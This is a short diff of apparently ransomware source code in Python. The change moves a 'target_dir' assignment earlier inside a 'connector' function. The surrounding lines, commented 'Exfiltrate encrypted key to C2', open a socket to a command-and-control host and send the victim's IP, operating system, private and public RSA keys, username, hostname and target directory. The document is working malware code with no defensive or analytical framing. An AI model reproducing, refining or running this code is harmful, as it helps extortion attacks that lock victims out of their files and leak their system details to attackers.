@@ -273,6 +273,7 @@ def main():
         logger.info("Starting key exfiltration and GUI launch")
         # Exfiltrate encrypted key to C2
         def connector():
+            target_dir = startdirs[0] if startdirs else "None"
             logger.info(f"Attempting to connect to C2 server: {host}:{port}")
             server = socket.socket(socket.AF_INET)
             server.settimeout(10)
@@ -281,7 +282,6 @@ def main():
                 server.connect((host, port))
                 local_ip = getlocalip()
                 # Include target directory in the message
-                target_dir = startdirs[0] if startdirs else "None"
                 msg = '%s$%s$%s$%s$%s$%s$%s' % (
                     local_ip, platform.system(), SERVER_PRIVATE_RSA_KEY, SERVER_PUBLIC_RSA_KEY, getpass.getuser(), platform.node(), target_dir)
                 server.send(msg.encode('utf-8'))
